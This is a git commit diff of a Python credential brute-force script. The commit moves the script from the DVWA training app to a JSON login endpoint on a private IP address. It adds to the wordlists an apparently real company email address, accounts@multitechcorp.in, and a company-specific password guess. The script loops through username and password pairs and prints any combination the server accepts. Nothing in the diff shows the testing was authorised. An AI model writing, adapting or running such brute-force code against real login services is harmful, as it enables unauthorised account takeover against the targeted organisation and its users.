4722404582a05b9f18aa3b0f198ae2b1f68aa176
dominic <dominicseduraja3@gmail.com>
2023-04-01 21:11:46 +0530

    brute

--- Request/brute.py
+++ Request/brute.py
@@ -1,19 +1,25 @@
 import requests
+import json
 
-URL = 'http://localhost/DVWA/vulnerabilities/brute/'
+URL = 'http://192.168.98.91:5777/mta/users/login'
 
-users = ['root', 'user', 'admin']
-passwords = ['admin', '1234', 'password']
+users = ['root', 'user', 'accounts@multitechcorp.in','test']
+passwords = ['admin', '1234', 'password','noo','mta@1234']
 
-cookies = {
-    'PHPSESSID':'9561b9fc42a4cd53c84a71e93fdfebb2',
-    'security':'imposible'
-}
+# for n in range(0,9999):
+#     print(n)
+
 
 for user in users:
     for password in passwords:
         print(f"Trying username={user} and password={password}")
-        payload=f'?username={user}&password={password}&Login=Login'
-        req = requests.get(URL + payload,cookies=cookies)
-        if not 'incorrect' in req.text:
-            print(f"Valid Credentials: {user}:{password}")
+
+        data = {
+            "email_id":user,
+            "password":password,
+            }
+
+        req = requests.post(URL, json=data)
+        dada = json.loads(req.text)
+        if dada.get("status"):
+            print(f'Valid credentil: {user}:{password}')
